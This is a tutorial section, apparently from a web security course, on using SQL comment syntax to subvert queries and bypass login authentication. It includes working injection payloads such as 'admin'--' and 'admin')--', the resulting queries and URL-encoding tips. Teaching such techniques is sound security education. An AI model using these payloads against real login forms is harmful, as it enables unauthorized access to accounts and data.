# Using Comments

In this section, we'll learn how to use comments to subvert SQL query logic and bypass login authentication.

## Overview

SQL comments allow you to document queries or ignore specific parts. MySQL supports:
- `--` (with trailing space)
- `#`
- `/* */` (inline)

**Note:** The `--` comment requires a space after it: `-- `. In URLs, this becomes `--+` since spaces encode as `+`.

## Basic Comment Usage

### Using `--`

```sql
SELECT username FROM logins; -- Selects usernames from the logins table
```

### Using `#`

```sql
SELECT * FROM logins WHERE username = 'admin'; # Rest of query ignored
```

**Tip:** In browsers, use `%23` instead of `#` since `#` is treated as a tag.

## Authentication Bypass

### Simple Bypass

Inject `admin'--` as the username:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

Result: Authentication bypassed since the password check is commented out.

### Bypass with Parentheses

When queries use parentheses like:

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='hash';
```

Use `admin')--` as the username to properly close and comment:

```sql
SELECT * FROM logins WHERE (username='admin')-- ' AND id > 1) AND password='hash';
```

Result: Only checks the username, bypassing all other conditions.
